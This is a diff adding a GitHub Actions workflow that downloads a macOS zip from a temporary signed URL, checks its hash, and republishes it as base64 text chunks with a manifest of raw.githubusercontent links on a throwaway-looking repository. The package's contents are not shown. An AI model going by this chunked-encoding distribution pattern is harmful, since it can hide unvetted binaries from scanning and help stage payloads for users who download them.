@@ -1,0 +1,89 @@
+name: Publish Trend Analyzer 1.2.0
+
+on:
+  push:
+    branches: [mainggg]
+    paths:
+      - ".github/workflows/trend-analyzer-publish-v120.yml"
+
+permissions:
+  contents: write
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download verified macOS artifact
+        env:
+          ARTIFACT_URL: "https://sdmntprpolandcentral.oaiusercontent.com/files/00000000-adb4-820a-ba54-916852ee9ec8/raw?se=2026-09-28T18%3A05%3A23Z&sp=r&sv=2026-02-06&sr=b&scid=3db044be-1478-53af-a2c6-286736581bee&skoid=76024c37-11e2-4c92-aa07-7e519fbe2d0f&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2026-09-28T04%3A12%3A19Z&ske=2026-09-29T04%3A12%3A19Z&sks=b&skv=2026-02-06&sig=/Wf6jXc4/NYwzGi9enSp8Q5YExPu4oBh35H1SkWObzc%3D"
+        run: |
+          set -euo pipefail
+          curl -fL "$ARTIFACT_URL" -o /tmp/trend-artifact.zip
+          rm -rf /tmp/trend-artifact
+          mkdir -p /tmp/trend-artifact
+          unzip -q /tmp/trend-artifact.zip -d /tmp/trend-artifact
+          test -s /tmp/trend-artifact/Trend-Analyzer-macOS.zip
+          test "$(sha256sum /tmp/trend-artifact/Trend-Analyzer-macOS.zip | awk '{print $1}')" = "b58cb02155a570ba3f21521555e5ed1ad23b4087fff1d4f11e46065f8587132b"
+
+      - name: Publish stable update feed
+        run: |
+          set -euo pipefail
+          ZIP=/tmp/trend-artifact/Trend-Analyzer-macOS.zip
+          DIR=trend-analyzer/releases/v1.2.0
+          rm -rf "$DIR"
+          mkdir -p "$DIR"
+
+          SHA=$(sha256sum "$ZIP" | awk '{print $1}')
+          SIZE=$(stat -c%s "$ZIP")
+          export SHA SIZE
+
+          base64 -w0 "$ZIP" > /tmp/trend-package.b64
+          split -b 50000 -d -a 2 /tmp/trend-package.b64 /tmp/trend-part-
+
+          i=0
+          for f in /tmp/trend-part-*; do
+            printf -v n "%02d" "$i"
+            cp "$f" "$DIR/part$n.txt"
+            i=$((i+1))
+          done
+
+          python3 - <<'PY'
+          import json, os
+          from pathlib import Path
+          root = Path("trend-analyzer/releases/v1.2.0")
+          parts = sorted(root.glob("part*.txt"))
+          manifest = {
+              "channel": "stable",
+              "version": "1.2.0",
+              "build_commit": "c9b7d58134a53962c1c7f2521ab2b7c0bb5ad0d3",
+              "package_sha256": os.environ["SHA"],
+              "package_size": int(os.environ["SIZE"]),
+              "parts": [
+                  f"https://raw.githubusercontent.com/v88218429-netizen/zzzz/mainggg/{p.as_posix()}"
+                  for p in parts
+              ],
+          }
+          out = Path("trend-analyzer/releases/manifest.json")
+          out.parent.mkdir(parents=True, exist_ok=True)
+          out.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
+          print(json.dumps(manifest, indent=2))
+          PY
+
+      - name: Verify feed reconstructs exact package
+        run: |
+          set -euo pipefail
+          cat trend-analyzer/releases/v1.2.0/part*.txt | base64 -d > /tmp/rebuilt.zip
+          cmp /tmp/rebuilt.zip /tmp/trend-artifact/Trend-Analyzer-macOS.zip
+          test "$(sha256sum /tmp/rebuilt.zip | awk '{print $1}')" = "b58cb02155a570ba3f21521555e5ed1ad23b4087fff1d4f11e46065f8587132b"
+          unzip -t /tmp/rebuilt.zip >/dev/null
+
+      - name: Commit stable release
+        run: |
+          set -euo pipefail
+          git config user.name "trend-analyzer-release-bot"
+          git config user.email "trend-analyzer-release-bot@users.noreply.github.com"
+          git add trend-analyzer/releases
+          git commit -m "release: Trend Analyzer 1.2.0 stable"
+          git push
